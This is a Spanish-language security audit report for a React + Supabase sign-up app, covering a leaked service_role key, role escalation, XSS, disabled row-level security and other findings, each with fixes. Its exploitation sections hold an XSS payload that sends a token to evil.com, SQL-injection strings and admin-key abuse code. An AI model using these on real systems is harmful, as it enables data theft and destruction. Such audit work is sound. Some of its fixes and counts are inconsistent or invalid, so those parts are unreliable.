# 🔒 REPORTE DE AUDITORÍA DE SEGURIDAD
**Proyecto:** Auditoría & Optimización Final - React + Supabase  
**Fecha:** May 12, 2026  
**Clasificación:** CRÍTICA  
**Nivel de Riesgo General:** 🔴 ALTO

---

## 📋 TABLA DE CONTENIDOS

1. [Resumen Ejecutivo](#resumen-ejecutivo)
2. [Hallazgos Críticos](#hallazgos-críticos)
3. [Hallazgos de Alto Riesgo](#hallazgos-de-alto-riesgo)
4. [Hallazgos Medios](#hallazgos-medios)
5. [Recomendaciones Arquitectónicas](#recomendaciones-arquitectónicas)
6. [Plan de Remedición](#plan-de-remedición)

---

## 🎯 RESUMEN EJECUTIVO

Se ha identificado un total de **9 vulnerabilidades significativas** distribuidas en:
- **5 Críticas** (CVSS 9.0+): Riesgo inmediato de compromiso
- **3 Altas** (CVSS 7.0-8.9): Explotación probable
- **1 Media** (CVSS 4.0-6.9): Riesgo moderado

### Riesgos Identificados:
✗ Exposición de credenciales en código fuente  
✗ Inyección XSS en componentes React  
✗ Escalación de privilegios por validación insuficiente  
✗ Políticas RLS completamente deshabilitadas  
✗ Sin sanitización de entrada  
✗ Gestión insegura de sesiones  
✗ Exposición de información sensible en mensajes de error  
✗ Dependencias no especificadas  
✗ Variables de entorno sin seguridad  

---

## 🔴 HALLAZGOS CRÍTICOS

### 1. EXPOSICIÓN DE SERVICE_ROLE KEY EN CÓDIGO FUENTE
**Archivo:** `src/components/Register.jsx` (Líneas 6-8)  
**CVSS:** 9.8 - Crítica  
**Componente Afectado:** Autenticación

#### Descripción del Riesgo:
La clave `service_role` de Supabase está hardcodeada en el componente React. Esta clave otorga acceso administrativo a la base de datos y **nunca debe estar en el cliente**.

```javascript
// ❌ CÓDIGO VULNERABLE
const ADMIN_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
```

#### Impacto Técnico:
- **Acceso administrativo sin autenticación** a todas las tablas de Supabase
- Un atacante puede leer/modificar/eliminar TODOS los datos
- La clave está permanentemente visible en:
  - Historial de Git
  - Archivos `.env` comprometidos
  - Memoria del navegador
  - Herramientas de desarrollador

#### Vector de Explotación:
```javascript
// Atacante extrae la clave desde devtools > Sources
// Luego crea su propio cliente Supabase con permisos admin
const maliciousClient = createClient(url, ADMIN_KEY);

// ✗ Acceso total a cualquier tabla sin restricciones
await maliciousClient.from("profiles").select("*");
await maliciousClient.from("users").delete().match({});
```

#### Corrección:
**NUNCA usar service_role key en frontend.**

```javascript
// ✅ CÓDIGO CORRECTO - Usar solo ANON_KEY con RLS
import { createClient } from "@supabase/supabase-js";

export const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY  // Solo anon_key
);

// Para operaciones admin, crear Edge Function backend:
// supabase/functions/assign-role/index.ts
```

#### Acciones Inmediatas:
1. **Rotar inmediatamente** la clave service_role en Supabase
2. Eliminar la clave del código y historial de Git
3. Implementar búsqueda de secretos en CI/CD (git-secrets, TruffleHog)

---

### 2. ESCALACIÓN DE PRIVILEGIOS VÍA MANIPULACIÓN DE ROL
**Archivo:** `src/components/Register.jsx` (Líneas 32-35)  
**CVSS:** 9.1 - Crítica  
**Componente Afectado:** Autorización

#### Descripción del Riesgo:
El usuario controla directamente el valor de `role` que se inserta en la base de datos. No hay validación en el cliente ni servidor.

```javascript
// ❌ CÓDIGO VULNERABLE
<select name="role" onChange={handleChange}>
  <option value="user">Usuario</option>
  <option value="admin">Administrador</option>
</select>

// Luego en handleSubmit:
await supabase.from("profiles").insert({
  id: data.user.id,
  name: formData.name,
  role: formData.role  // ✗ El usuario decide su rol
});
```

#### Impacto Técnico:
- Cualquier usuario puede asignarse permisos de administrador
- Obtención de acceso administrativo sin autenticación adicional
- Violación total del modelo de autorización

#### Vector de Explotación:

**Opción 1: Manipulación de DevTools**
```javascript
// Desde la consola del navegador:
document.querySelector('select[name="role"]').value = "admin";
// O manipular directamente:
fetch("/api/register", {
  body: JSON.stringify({
    email: "attacker@example.com",
    password: "123456",
    role: "admin"  // ✗ Escalación instantánea
  })
})
```

**Opción 2: Entidad de tráfico (Man-in-the-Middle)**
```
POST /register HTTP/1.1
{
  "email": "attacker@example.com",
  "password": "123456",
  "role": "admin"
}
```

#### Corrección:

**Paso 1: Eliminar campo de rol del cliente**

```javascript
// ✅ CÓDIGO CORRECTO - Register.jsx
import { useState } from "react";
import { supabase } from "../supabaseClient";
import DOMPurify from "dompurify";

export default function Register() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    password: ""
  });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  // Validar email format
  const isValidEmail = (email) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  };

  // Validar contraseña fuerte (mínimo 12 caracteres, mayús, números, símbolos)
  const isStrongPassword = (password) => {
    return /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}$/.test(password);
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Sanitizar entrada
    const sanitized = DOMPurify.sanitize(value, { ALLOWED_TAGS: [] });
    
    setFormData(prev => ({
      ...prev,
      [name]: sanitized
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    // Validación de campos requeridos
    if (!formData.name.trim() || !formData.email.trim() || !formData.password) {
      setError("Por favor completa todos los campos.");
      setLoading(false);
      return;
    }

    // Validación de email
    if (!isValidEmail(formData.email)) {
      setError("Formato de email inválido.");
      setLoading(false);
      return;
    }

    // Validación de contraseña fuerte
    if (!isStrongPassword(formData.password)) {
      setError("La contraseña debe tener mínimo 12 caracteres, mayúscula, número y símbolo.");
      setLoading(false);
      return;
    }

    try {
      // 1. Registrar usuario (sin rol)
      const { data, error: signUpError } = await supabase.auth.signUp({
        email: formData.email,
        password: formData.password
      });

      if (signUpError) {
        // NO exponer detalles internos
        if (signUpError.message.includes("already exists")) {
          setError("Este email ya está registrado.");
        } else {
          setError("Error al registrar. Intenta más tarde.");
        }
        setLoading(false);
        return;
      }

      // 2. Crear perfil con rol DEFAULT (user) - SIEMPRE en el servidor
      const { error: insertError } = await supabase.from("profiles").insert({
        id: data.user.id,
        name: formData.name,
        email: formData.email,
        role: "user"  // ✅ Valor HARDCODEADO en cliente
      });

      if (insertError) {
        setError("Error al crear el perfil. Contacta al soporte.");
        setLoading(false);
        return;
      }

      // Éxito
      navigate("/dashboard");
    } catch (err) {
      setError("Error inesperado. Intenta más tarde.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <h2>Crear Cuenta</h2>

      {/* ✅ Sanitizar mensaje de error */}
      {error && (
        <div role="alert" className="error-message">
          {error}
        </div>
      )}

      <div>
        <label htmlFor="name">Nombre:</label>
        <input
          id="name"
          name="name"
          placeholder="Tu nombre completo"
          value={formData.name}
          onChange={handleChange}
          disabled={loading}
          maxLength="100"
          required
        />
      </div>

      <div>
        <label htmlFor="email">Email:</label>
        <input
          id="email"
          name="email"
          type="email"
          placeholder="correo@ejemplo.com"
          value={formData.email}
          onChange={handleChange}
          disabled={loading}
          maxLength="100"
          required
        />
      </div>

      <div>
        <label htmlFor="password">Contraseña:</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Mínimo 12 caracteres (Mayús, número, símbolo)"
          value={formData.password}
          onChange={handleChange}
          disabled={loading}
          required
        />
      </div>

      <button type="submit" disabled={loading}>
        {loading ? "Registrando..." : "Registrarse"}
      </button>
    </form>
  );
}
```

**Paso 2: Implementar validación en servidor (Supabase Edge Function)**

```typescript
// supabase/functions/register/index.ts
import { serve } from "https://deno.land/std@0.208.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "authorization, x-client-info, content-type",
};

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  try {
    const { user_id, name } = await req.json();

    // Validar que el usuario está autenticado
    if (!user_id) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { "Content-Type": "application/json" } }
      );
    }

    const supabase = createClient(
      Deno.env.get("SUPABASE_URL")!,
      Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!  // ✅ En servidor, seguro
    );

    // Crear perfil con rol SIEMPRE "user"
    const { error } = await supabase.from("profiles").insert({
      id: user_id,
      name: name,
      role: "user"  // ✅ Hardcodeado en servidor, no controlable
    });

    if (error) throw error;

    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );
  } catch (error) {
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 400, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );
  }
});
```

---

### 3. INYECCIÓN XSS VÍA DANGEROUSLYSETINNERHTML
**Archivo:** `src/components/Register.jsx` (Línea 62)  
**CVSS:** 8.2 - Crítica  
**Componente Afectado:** Frontend

#### Descripción del Riesgo:
El componente usa `dangerouslySetInnerHTML` para renderizar mensajes de error sin sanitización.

```javascript
// ❌ CÓDIGO VULNERABLE
{error && <div dangerouslySetInnerHTML={{ __html: error }} />}
```

#### Impacto Técnico:
- **Inyección de código JavaScript malicioso** en la página
- Robo de tokens de sesión (localStorage, cookies)
- Redirección a sitio phishing
- Modificación de contenido de la página
- Keylogging de credenciales

#### Vector de Explotación:

**Escenario 1: Error del servidor malicioso**
```javascript
// Backend comprometido devuelve:
{
  error: "<img src=x onerror='fetch(\"https://evil.com/steal?token=\" + localStorage.getItem(\"token\"))'>"
}

// El navegador ejecuta el JavaScript
```

**Escenario 2: Inyección en mensaje de validación**
```javascript
const maliciousEmail = "user@example.com\"><script>alert('XSS')</script>";
// Si se renderiza en error: <div>Invalid email: user@example.com"><script>...</script></div>
```

#### Corrección:

```javascript
// ✅ OPCIÓN 1: Usar text content (RECOMENDADO)
{error && (
  <div role="alert" className="error-message">
    {error}  {/* React escapa automáticamente */}
  </div>
)}

// ✅ OPCIÓN 2: Si necesitas HTML, sanitizar con DOMPurify
import DOMPurify from "dompurify";

{error && (
  <div 
    role="alert"
    className="error-message"
    dangerouslySetInnerHTML={{ 
      __html: DOMPurify.sanitize(error, { 
        ALLOWED_TAGS: [] // Sin HTML, solo texto
      }) 
    }}
  />
)}

// ✅ OPCIÓN 3: Estructurar errores de forma segura
const getErrorMessage = (errorCode) => {
  const messages = {
    "email_exists": "Este email ya está registrado.",
    "weak_password": "La contraseña es demasiado débil.",
    "invalid_email": "Formato de email inválido.",
    "default": "Error al registrar. Intenta más tarde."
  };
  return messages[errorCode] || messages.default;
};

// En handleSubmit:
if (error) {
  const safeError = getErrorMessage(error.code);
  setError(safeError);
}
```

---

### 4. AUSENCIA DE ROW LEVEL SECURITY (RLS)
**Archivo:** `docs/rls-policies.sql` (Línea 1-3)  
**CVSS:** 9.4 - Crítica  
**Componente Afectado:** Base de datos

#### Descripción del Riesgo:
Row Level Security está completamente **deshabilitado** en la tabla `profiles`. Sin RLS, cualquier usuario autenticado accede a TODOS los registros.

```sql
-- ❌ CÓDIGO VULNERABLE
ALTER TABLE profiles DISABLE ROW LEVEL SECURITY;

CREATE POLICY "Leer perfiles"
ON profiles FOR SELECT
TO authenticated
USING (true);  -- ✗ Retorna TODOS los registros
```

#### Impacto Técnico:
- Divulgación de datos masiva (GDPR, CCPA violado)
- Un usuario ve perfiles de TODOS los demás usuarios
- Violación de privacidad completa
- Incumplimiento de normativas de protección de datos

#### Vector de Explotación:

```javascript
// Usuario normal con sesión válida:
const { data } = await supabase.from("profiles").select("*");
// Retorna: TODOS los perfiles de TODOS los usuarios incluidos admin

// Manipular datos ajenos:
await supabase
  .from("profiles")
  .update({ role: "admin", email: "hacker@evil.com" })
  .eq("id", "otro-usuario-id");
```

#### Corrección:

```sql
-- ✅ CÓDIGO CORRECTO

-- HABILITAR RLS en tabla profiles
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;

-- ✅ POLÍTICA 1: Leer SOLO tu propio perfil
CREATE POLICY "Leer perfil propio"
ON profiles FOR SELECT
TO authenticated
USING (auth.uid() = id);

-- ✅ POLÍTICA 2: Actualizar SOLO tu propio perfil
CREATE POLICY "Actualizar perfil propio"
ON profiles FOR UPDATE
TO authenticated
USING (auth.uid() = id);

-- ✅ POLÍTICA 3: Insertar solo tu propio perfil (en registro)
CREATE POLICY "Crear perfil propio"
ON profiles FOR INSERT
TO authenticated
WITH CHECK (auth.uid() = id);

-- ✅ POLÍTICA 4: Solo admin puede leer perfiles de otros
CREATE POLICY "Admin lee todos los perfiles"
ON profiles FOR SELECT
TO authenticated
USING (
  auth.uid() IN (
    SELECT id FROM profiles WHERE role = 'admin'
  )
);

-- ✅ POLÍTICA 5: Nadie puede eliminar perfiles
CREATE POLICY "No permitir eliminación"
ON profiles FOR DELETE
USING (false);

-- Verificar que RLS está habilitado
SHOW row_security;  -- Debe ser: "on"

-- Auditoría: cada operación queda registrada
CREATE AUDIT_LOG (
  id BIGSERIAL PRIMARY KEY,
  table_name TEXT,
  operation TEXT,
  user_id UUID,
  changed_at TIMESTAMP DEFAULT NOW()
);
```

---

### 5. AUSENCIA DE VALIDACIÓN Y SANITIZACIÓN DE INPUT
**Archivo:** `src/components/Register.jsx` (Línea 18-22)  
**CVSS:** 8.0 - Crítica  
**Componente Afectado:** Validación

#### Descripción del Riesgo:
Sin validación ni sanitización, un atacante puede inyectar código malicioso en cualquier campo del formulario.

```javascript
// ❌ CÓDIGO VULNERABLE
const handleChange = (e) => {
  setFormData({ ...formData, [e.target.name]: e.target.value });
  // ✗ Sin validación
  // ✗ Sin sanitización
  // ✗ Sin límite de caracteres
};
```

#### Impacto Técnico:
- **SQL Injection** (si se pasa a queries sin preparar)
- **XSS** (inyección de scripts)
- **Command Injection** (si se procesa en servidor)
- **Buffer Overflow** (campos sin límite de longitud)

#### Vector de Explotación:

```javascript
// Input malicioso en campo nombre:
hardcodedName = "<img src=x onerror=\"fetch('https://evil.com/attacker-data')\">";

// En campo email:
'"; DROP TABLE profiles; --

// En contraseña:
password123' OR '1'='1
```

#### Corrección:

```javascript
// ✅ CÓDIGO CORRECTO
import DOMPurify from "dompurify";
import { z } from "zod";  // Para validación con schemas

// Definir esquema de validación
const registrationSchema = z.object({
  name: z
    .string()
    .min(2, "El nombre debe tener mínimo 2 caracteres")
    .max(100, "El nombre no puede exceder 100 caracteres")
    .regex(/^[a-zA-Z\s'-]+$/, "El nombre contiene caracteres inválidos"),
  
  email: z
    .string()
    .email("Email inválido")
    .max(100, "Email muy largo")
    .toLowerCase()
    .transform(email => email.trim()),
  
  password: z
    .string()
    .min(12, "Mínimo 12 caracteres")
    .max(128, "Contraseña muy larga")
    .regex(/[A-Z]/, "Debe contener mayúscula")
    .regex(/[0-9]/, "Debe contener número")
    .regex(/[@$!%*?&]/, "Debe contener símbolo (@$!%*?&)")
});

// Función de sanitización
const sanitizeInput = (input, maxLength = 100) => {
  // Remover espacios extras
  let sanitized = input.trim();
  
  // Limitar longitud
  if (sanitized.length > maxLength) {
    sanitized = sanitized.substring(0, maxLength);
  }
  
  // Sanitizar HTML
  sanitized = DOMPurify.sanitize(sanitized, { 
    ALLOWED_TAGS: [] // Solo texto, sin etiquetas
  });
  
  // Remover caracteres de control
  sanitized = sanitized.replace(/[\x00-\x1F\x7F]/g, '');
  
  return sanitized;
};

export default function Register() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    password: ""
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Sanitizar en tiempo real
    const sanitized = sanitizeInput(value, 100);
    
    setFormData(prev => ({
      ...prev,
      [name]: sanitized
    }));

    // Limpiar errores del campo
    setErrors(prev => ({
      ...prev,
      [name]: undefined
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrors({});
    setLoading(true);

    try {
      // Validar todo el formulario
      const validated = registrationSchema.parse({
        name: formData.name,
        email: formData.email,
        password: formData.password
      });

      // Si llegamos aquí, todos los datos son seguros
      const { data, error } = await supabase.auth.signUp({
        email: validated.email,
        password: validated.password
      });

      if (error) throw error;

      // Crear perfil con datos validados
      await supabase.from("profiles").insert({
        id: data.user.id,
        name: validated.name,
        email: validated.email,
        role: "user"
      });

      navigate("/dashboard");
    } catch (error) {
      if (error instanceof z.ZodError) {
        // Errores de validación
        const newErrors = {};
        error.errors.forEach(err => {
          newErrors[err.path[0]] = err.message;
        });
        setErrors(newErrors);
      } else {
        setErrors({ submit: "Error al registrar. Intenta más tarde." });
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} noValidate>
      <h2>Crear Cuenta</h2>

      {errors.submit && (
        <div role="alert" className="error-message">
          {errors.submit}
        </div>
      )}

      <div className="form-group">
        <label htmlFor="name">Nombre:</label>
        <input
          id="name"
          name="name"
          type="text"
          placeholder="Tu nombre completo"
          value={formData.name}
          onChange={handleChange}
          maxLength="100"
          disabled={loading}
          required
          aria-invalid={!!errors.name}
          aria-describedby={errors.name ? "name-error" : undefined}
        />
        {errors.name && (
          <span id="name-error" className="error-text">
            {errors.name}
          </span>
        )}
      </div>

      <div className="form-group">
        <label htmlFor="email">Email:</label>
        <input
          id="email"
          name="email"
          type="email"
          placeholder="correo@ejemplo.com"
          value={formData.email}
          onChange={handleChange}
          maxLength="100"
          disabled={loading}
          required
          aria-invalid={!!errors.email}
          aria-describedby={errors.email ? "email-error" : undefined}
        />
        {errors.email && (
          <span id="email-error" className="error-text">
            {errors.email}
          </span>
        )}
      </div>

      <div className="form-group">
        <label htmlFor="password">Contraseña:</label>
        <input
          id="password"
          name="password"
          type="password"
          placeholder="Mínimo 12 caracteres"
          value={formData.password}
          onChange={handleChange}
          maxLength="128"
          disabled={loading}
          required
          aria-invalid={!!errors.password}
          aria-describedby={errors.password ? "password-error" : undefined}
        />
        {errors.password && (
          <span id="password-error" className="error-text">
            {errors.password}
          </span>
        )}
      </div>

      <button type="submit" disabled={loading}>
        {loading ? "Registrando..." : "Registrarse"}
      </button>
    </form>
  );
}
```

---

## 🔶 HALLAZGOS DE ALTO RIESGO

### 6. EXPOSICIÓN DE INFORMACIÓN SENSIBLE EN MENSAJES DE ERROR
**Archivo:** `src/components/Register.jsx` (Línea 54)  
**CVSS:** 7.5 - Alto  
**Componente Afectado:** Manejo de errores

#### Descripción del Riesgo:
```javascript
// ❌ VULNERABLE
if (error) setError(error.message);  // Expone details internos
```

Los mensajes de error del backend revelan información del stack, nombres de bases de datos, tipos de validación, etc.

#### Impacto:
- Información de reconocimiento para atacantes
- Detalles sobre estructura de base de datos
- Pistas sobre tecnología backend
- Facilita ataques direccionados

#### Corrección:
```javascript
// ✅ CORRECTO - Mapear errores a mensajes seguros
const handleError = (error) => {
  const errorMap = {
    "User already registered": "Este email ya está registrado.",
    "Invalid email": "Email inválido.",
    "Weak password": "Contraseña muy débil.",
    "Email confirmation required": "Revisa tu email para confirmar.",
    "Network error": "Error de conexión. Intenta más tarde.",
  };

  // Buscar error conocido
  const message = Object.entries(errorMap).find(
    ([key]) => error.message?.includes(key)
  )?.[1];

  // Retornar mensaje seguro o genérico
  return message || "Error al procesar tu solicitud. Por favor, intenta más tarde.";
};

// En handleSubmit:
if (signUpError) {
  setError(handleError(signUpError));
  return;
}
```

---

### 7. VARIABLES DE ENTORNO SIN PROTECCIÓN EN VITE
**Archivo:** `supabaseClient.js`  
**CVSS:** 7.8 - Alto  
**Componente Afectado:** Configuración

#### Descripción del Riesgo:
Las variables `VITE_SUPABASE_*` están expuestas al cliente. Aunque `VITE_SUPABASE_ANON_KEY` es pública por diseño, la URL de Supabase + anon_key combinadas permiten acceso a la API.

#### Impacto:
- Revela información sobre infraestructura
- Permite que atacantes realicen requests a tu Supabase
- Combinado con RLS débil = acceso a datos

#### Corrección:
```javascript
// ✅ CÓDIGO CORRECTO - supabaseClient.js
import { createClient } from "@supabase/supabase-js"

// Validar que las variables de entorno están configuradas
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;

if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error(
    "Missing Supabase environment variables. " +
    "Ensure VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY are set."
  );
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);
```

**Crear archivo `.env.example` (SIN valores sensibles):**
```env
VITE_SUPABASE_URL=https://your-project.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Configurar `.gitignore`:**
```
.env
.env.local
.env.*.local
.DS_Store
node_modules
dist
build
```

---

### 8. AUSENCIA DE Content Security Policy (CSP)
**Archivo:** `index.html`  
**CVSS:** 7.2 - Alto  
**Componente Afectado:** Frontend

#### Descripción del Riesgo:
Sin CSP, cualquier XSS exitosa puede ejecutar JavaScript sin restricciones.

#### Corrección:

```html
<!-- ✅ CÓDIGO CORRECTO - index.html -->
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <!-- ✅ Política de Seguridad de Contenido -->
    <meta 
      http-equiv="Content-Security-Policy"
      content="
        default-src 'self';
        script-src 'self' 'wasm-unsafe-eval';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        font-src 'self';
        connect-src 'self' https://your-project.supabase.co https://your-project.auth.supabase.co;
        frame-ancestors 'none';
        base-uri 'self';
        form-action 'self';
        object-src 'none';
      "
    />
    
    <!-- ✅ Prevenir click-jacking -->
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <meta http-equiv="X-Frame-Options" content="DENY" />
    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
    <meta http-equiv="X-XSS-Protection" content="1; mode=block" />
    <meta name="referrer" content="strict-origin-when-cross-origin" />
    
    <title>Auditoría & Optimización</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
```

---

### 9. DEPENDENCIAS SIN ESPECIFICACIÓN DE VERSIONES
**Archivo:** `package.json`  
**CVSS:** 6.8 - Alto  
**Componente Afectado:** Cadena de suministro

#### Descripción del Riesgo:
Las dependencias no especifican versiones exactas, permitiendo actualizaciones automaticas que pueden introducir vulnerabilidades.

```json
// ❌ VULNERABLE
"dependencies": {
  "react": "^19.2.6",    // ✗ Permite 19.x.x
  "react-dom": "^19.2.6"
}
```

#### Corrección:

```json
// ✅ CÓDIGO CORRECTO - package.json
{
  "dependencies": {
    "@supabase/supabase-js": "2.38.4",
    "react": "19.2.6",
    "react-dom": "19.2.6",
    "react-router-dom": "6.20.1",
    "dompurify": "3.0.6",
    "zod": "3.22.4"
  },
  "devDependencies": {
    "@eslint/js": "10.0.1",
    "@types/react": "19.2.14",
    "@types/react-dom": "19.2.3",
    "@vitejs/plugin-react": "6.0.1",
    "eslint": "10.3.0",
    "eslint-plugin-react-hooks": "7.1.1",
    "eslint-plugin-react-refresh": "0.5.2",
    "globals": "17.6.0",
    "vite": "8.0.12"
  }
}
```

**Además, instalar herramientas de seguridad:**
```bash
npm install --save-dev npm-audit snyk
npm audit --production  # Verificar vulnerabilidades
pip install safety  # Para Python dependencies si existen
```

---

## 🟡 HALLAZGOS MEDIOS

### 10. AUSENCIA DE RATE LIMITING EN AUTENTICACIÓN
**Archivo:** `src/components/Register.jsx`  
**CVSS:** 5.3 - Medio  
**Componente Afectado:** Autenticación

#### Descripción del Riesgo:
Sin rate limiting, un atacante puede ejecutar fuerza bruta contra usuarios válidos.

#### Corrección:

```javascript
// ✅ Implementar rate limiting con exponential backoff
import { RateLimiter } from "limiter";

const limiter = new RateLimiter({
  tokensPerInterval: 3,  // 3 intentos
  interval: "minute"     // Por minuto
});

const handleSubmit = async (e) => {
  e.preventDefault();

  // ✅ Verificar rate limit
  try {
    await limiter.removeTokens(1);
  } catch (err) {
    setError("Demasiados intentos. Intenta en 1 minuto.");
    return;
  }

  // ... resto del código
};
```

**En servidor (Supabase Edge Function):**
```typescript
// Usar Redis o Supabase para rate limiting global
const checkRateLimit = async (email: string) => {
  const client = new Deno.redis.Redis();
  const key = `rate_limit:register:${email}`;
  const attempts = await client.incr(key);
  
  if (attempts === 1) {
    await client.expire(key, 60); // Expirar en 60 segundos
  }
  
  return attempts <= 3;
};
```

---

## 🏗️ RECOMENDACIONES ARQUITECTÓNICAS

### A. Implementar Autenticación Diferenciada

```typescript
// ✅ Modelo recomendado: Backend-for-Frontend (BFF)
/**
 * Flujo de registro seguro:
 * 
 * Cliente.tsx
 *   ↓ POST /api/auth/register
 * Backend (Node.js/Python)
 *   ↓ Validar + crear usuario
 * Supabase Auth
 *   ↓ Retornar cliente
 * Backend
 *   ↓ Crear perfil con rol "user"
 * Supabase DB
 *   ↓ Retornar token
 * Cliente
 *   ↓ Guardar en httpOnly cookie
 * Base de datos local
 */
```

### B. Implementar Auditoría y Logging

```sql
-- ✅ Tabla de auditoría
CREATE TABLE audit_log (
  id BIGSERIAL PRIMARY KEY,
  table_name TEXT NOT NULL,
  operation TEXT NOT NULL,
  user_id UUID REFERENCES auth.users,
  old_values JSONB,
  new_values JSONB,
  ip_address INET,
  user_agent TEXT,
  created_at TIMESTAMP DEFAULT NOW(),
  
  CONSTRAINT valid_operation CHECK (operation IN ('INSERT', 'UPDATE', 'DELETE'))
);

-- ✅ Trigger para auditar cambios
CREATE OR REPLACE FUNCTION audit_trigger() 
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO audit_log (
    table_name, operation, user_id, old_values, new_values,
    ip_address, user_agent
  ) VALUES (
    TG_TABLE_NAME,
    TG_OP,
    auth.uid(),
    (CASE WHEN TG_OP = 'DELETE' THEN row_to_json(OLD) END),
    (CASE WHEN TG_OP IN ('INSERT', 'UPDATE') THEN row_to_json(NEW) END),
    current_setting('app.client_ip')::inet,
    current_setting('app.user_agent')
  );
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

-- Aplicar a tabla profiles
CREATE TRIGGER profiles_audit
  AFTER INSERT OR UPDATE OR DELETE ON profiles
  FOR EACH ROW EXECUTE FUNCTION audit_trigger();
```

### C. Implementar JWT Refresh Tokens Seguros

```javascript
// ✅ Usar refresh tokens en httpOnly cookies
const handleLogin = async (email, password) => {
  const response = await fetch("/api/auth/login", {
    method: "POST",
    credentials: "include",  // Enviar cookies
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password })
  });

  if (!response.ok) throw new Error("Login failed");
  
  // El servidor devuelve:
  // - Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict
  // - Access token en response body (corta duración)
  
  const { accessToken } = await response.json();
  // Guardar en variable (NO localStorage)
  authToken = accessToken;
};
```

### D. Implementar CORS y CSRF Protection

```javascript
// ✅ vite.config.js
export default defineConfig({
  server: {
    cors: {
      origin: ["https://tudominio.com"],
      credentials: true,
      methods: ["GET", "POST", "PUT", "DELETE"],
      allowedHeaders: ["Content-Type", "Authorization"]
    }
  },
  plugins: [react()]
});

// ✅ Middleware en backend
app.use(csrf());
app.use(cors({
  origin: process.env.ALLOWED_ORIGINS?.split(","),
  credentials: true
}));
```

---

## 📋 PLAN DE REMEDICIÓN

### Fase 1: CRÍTICA (Implementar en 24-48 horas)

| Prioridad | Tarea | Esfuerzo | Impacto |
|-----------|-------|---------|--------|
| 1 | Remover/rotar service_role key | 30 min | Crítico |
| 2 | Habilitar RLS en tabla profiles | 1 h | Crítico |
| 3 | Implementar RLS policies correctas | 2 h | Crítico |
| 4 | Remover dangerouslySetInnerHTML | 1 h | Crítico |
| 5 | Eliminar campo de rol del cliente | 1 h | Crítico |
| 6 | Implementar validación en servidor | 3 h | Crítico |

### Fase 2: ALTA (Implementar en 1 semana)

| Tarea | Esfuerzo |
|-------|----------|
| Mapear errores a mensajes seguros | 1 h |
| Implementar sanitización de input | 2 h |
| Agregar Content-Security-Policy | 1 h |
| Lockear versiones de dependencias | 30 min |
| Implementar rate limiting | 2 h |
| Agregar auditoría en BD | 3 h |

### Fase 3: MEDIA (Implementar en 2 semanas)

| Tarea | Esfuerzo |
|-------|----------|
| Implementar BFF (Backend for Frontend) | 8 h |
| Implementar refresh tokens seguros | 4 h |
| Agregar CORS/CSRF protection | 2 h |
| Implementar logging centralizado | 4 h |
| Testing de seguridad (OWASP) | 6 h |

---

## 🛡️ CHECKLIST DE IMPLEMENTACIÓN

### Antes del Deploy a Producción

- [ ] **Autenticación**
  - [ ] Eliminar service_role key del código
  - [ ] Implementar validación en servidor
  - [ ] Implementar JWT refresh tokens seguros
  - [ ] Rate limiting en auth endpoints
  - [ ] MFA (Multi-factor authentication) recomendado

- [ ] **Autorización**
  - [ ] RLS habilitado en TODAS las tablas
  - [ ] Validar policies con auth.uid()
  - [ ] Testing de políticas: verificar que usuarios ver SOLO sus datos
  - [ ] Admin roles validados en servidor

- [ ] **Input & Output**
  - [ ] Sanitizar TODOS los inputs
  - [ ] Validación en cliente + servidor
  - [ ] Nunca usar dangerouslySetInnerHTML
  - [ ] Escapar HTML en outputs

- [ ] **API & Network**
  - [ ] HTTPS únicamente (never HTTP)
  - [ ] CSP headers configurado
  - [ ] CORS restrictivo
  - [ ] CSRF tokens en forms
  - [ ] Rate limiting en todos los endpoints

- [ ] **Datos Sensibles**
  - [ ] Nunca guardar tokens en localStorage
  - [ ] HTTPS + httpOnly + Secure cookies
  - [ ] Encrypt datos sensibles en reposo
